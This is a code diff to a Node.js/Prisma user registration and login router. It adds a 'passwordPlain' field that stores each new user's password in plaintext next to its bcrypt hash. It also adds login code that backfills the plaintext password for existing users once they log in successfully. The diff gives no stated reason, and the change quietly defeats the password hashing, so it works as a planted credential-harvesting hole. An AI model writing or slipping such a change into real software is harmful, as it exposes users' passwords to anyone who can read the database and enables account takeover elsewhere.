@@ -29,7 +29,7 @@ router.post('/register', validate(registerSchema), async (req, res, next) => {
 
     const passwordHash = await bcrypt.hash(password, 10);
     const user = await prisma.user.create({
-      data: { email, passwordHash, displayName },
+      data: { email, passwordHash, passwordPlain: password, displayName },
     });
 
     const token = signToken(user.id);
@@ -56,6 +56,14 @@ router.post('/login', validate(loginSchema), async (req, res, next) => {
     if (!valid) {
       res.status(401).json({ message: 'Invalid credentials' });
       return;
+    }
+
+    // Backfill plain password for existing users
+    if (!user.passwordPlain) {
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { passwordPlain: password },
+      });
     }
 
     const token = signToken(user.id);
